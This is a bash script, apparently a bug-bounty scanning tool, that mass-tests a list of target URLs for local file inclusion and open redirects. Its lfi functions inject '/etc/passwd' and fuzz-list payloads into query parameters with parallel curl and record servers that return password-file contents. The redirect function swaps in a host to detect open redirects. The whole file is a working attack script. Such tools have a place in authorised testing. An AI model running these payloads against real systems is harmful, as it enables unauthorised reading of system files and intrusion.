#!/bin/bash


TARGET=$1

WORKING_DIR=$(pwd -P)

RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;36m"
YELLOW="\033[1;33m"
RESET="\033[0m"

LHOST="http://localhost"

runBanner(){
    name=$1
    echo -e "${RED}\n[+] Running $name...${RESET}"
}

lfi (){
	runBanner "CHEAKING FOR LFI"
	cat $TARGET | gf lfi | qsreplace "/etc/passwd" |\
	xargs -I % -P 15 sh -c 'curl -s "%" 2>&1 |\
	grep -q "root:" && echo "%" | tee -a lfi_result.txt'


	echo -e "${BLUE}[*] Check the result at $WORKING_DIR/lfi_result.txt${RESET}"
}

lfi_Fuzz(){
	runBanner "CHEAKING FOR LFI"
	cat $TARGET | gf lfi | qsreplace FUZZ | anew lfi.txt
	
	for i in $(cat lfi.txt); do ffuf -w ~/mylist/find_lfi.txt -u "$i"  -c=true -sa=true  -sf=true -se=true -mc=302  -v 2>/dev/null ; done

	
	echo -e "${BLUE}[*] Check the result at $WORKING_DIR/${RESET}"
}


n=0
lfi_Fuzz2 (){
	for i in $( cat ~/mylist/find_lfi.txt ); do \
		(
			n=$((n+1))
			runBanner "CHEAKING FOR LFI"
			echo -e "${BLUE}$n: $i${RESET}"
			cat $TARGET | gf lfi | qsreplace "$i" |\
			xargs -I % -P 15 sh -c 'curl -s "%" 2>&1 |\
			grep -q "root:" && echo "%" | tee -a lfi_result.txt'
		);
	done
	echo -e "${BLUE}[*] Check the result at $WORKING_DIR/lfi_result.txt${RESET}"
}

redirect(){
	runBanner "CHEAKING FOR OPEN REDIRECT";
	cat $TARGET | gf redirect | qsreplace "$LHOST" |\
	xargs -I % -P 15 sh -c 'curl -Is "%" 2>&1 |\
	grep -q "Location: $LHOST" && echo "%" | tee -a redirect_result.txt';

	echo -e "${BLUE}[*] Check the result at $WORKING_DIR/redirect_result.txt${RESET}"
}

lfi
# lfi_Fuzz2
redirect